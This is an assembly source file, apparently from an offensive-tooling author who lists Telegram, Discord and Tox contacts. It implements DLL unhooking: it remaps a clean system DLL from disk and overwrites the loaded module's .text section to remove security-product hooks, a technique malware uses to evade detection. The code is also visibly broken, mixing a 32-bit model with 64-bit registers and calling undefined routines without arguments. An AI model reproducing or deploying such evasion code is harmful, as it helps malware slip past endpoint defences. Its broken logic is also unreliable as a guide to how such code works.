; unhookDll.asm
; 2024
; Telegram: https://t.me/strikelab
; Discord: @patchguard
; Tox: 5BCB80569AC334FDA5B7806ABC05DDFE3AF8F126E08D0EA6D21DA3C13B43F164188C3EEE89E9
; unhook dlls used by ring3

.model flat, stdcall
.stack 4096

include windows.inc
include kernel32.inc
include psapi.inc
include shlwapi.inc

includelib kernel32.lib
includelib psapi.lib
includelib shlwapi.lib

.data
    sysWow64Path db ":\\Windows\\SysWOW64\\", 0
    sys32Path db ":\\Windows\\System32\\", 0

.code
public unhookDll

unhookDll PROC
    ; args: rdi = HANDLE hProcess, rsi = LPCWSTR name

    test    rsi, rsi
    jz      done

    test    rdi, rdi
    jz      done

    sub     rsp, 0x400
    mov     rcx, rsp
    mov     rbx, rcx

    mov     rdx, rcx
    call    GetWindowsDirectoryW
    test    rax, rax
    jz      done

    mov     byte ptr [rbx+1], 0
    lea     rdx, [rbx+2]
    mov     rax, 0x003A005C     ; ":\\"
    mov     [rbx+1], al
    mov     [rbx+3], ah

    ; check x64 OS / x86 process
    call    Is64BitOperatingSystem
    test    al, al
    jz      not64bit

    lea     rdx, [sysWow64Path]
    jmp     append_path

not64bit:
    lea     rdx, [sys32Path]

append_path:
    call    lstrcatW

    mov     rcx, rsi
    call    GetModuleHandleW
    test    rax, rax
    jz      done

    mov     rcx, rdi
    mov     rdx, rax
    lea     r8, [rsp+0x200]
    call    GetModuleInformation
    test    al, al
    jz      done

    mov     rcx, rsp
    mov     rdx, GENERIC_READ
    mov     r8, FILE_SHARE_READ
    mov     r9, NULL
    call    CreateFileW
    test    rax, rax
    jz      done

    mov     rcx, rax
    mov     rdx, NULL
    mov     r8, PAGE_READONLY | SEC_IMAGE
    mov     r9, 0
    call    CreateFileMappingW
    test    rax, rax
    jz      done

    mov     rcx, rax
    mov     rdx, FILE_MAP_READ
    mov     r8, 0
    mov     r9, 0
    call    MapViewOfFile
    test    rax, rax
    jz      done

    ; to parse PE headers
    mov     rcx, rsi             ; Buffer base address
    call    GetNtHeaders
    mov     rax, [rcx+0x3C]      ; e_lfanew
    add     rcx, rax
    mov     rax, [rcx+0x6]
    mov     rbx, rax
    add     rcx, 0x18

parse_sections:
    mov     rdx, [rcx]
    cmp     dword ptr [rdx], '.text'
    jne     next_section
    mov     rdx, [rcx+0x14]      ; VirtualAddress
    mov     r8, [rcx+0x10]       ; SizeOfRawData
    mov     r9, rsi              ; mapped base address
    mov     rax, rsi             ; original module base address
    add     rax, rdx
    call    VirtualProtectEx
    call    WriteProcessMemory
    call    VirtualProtectEx
    jmp     done

next_section:
    add     rcx, 0x28
    dec     rbx
    jnz     parse_sections

done:
    add     rsp, 0x400
    ret

unhookDll ENDP
END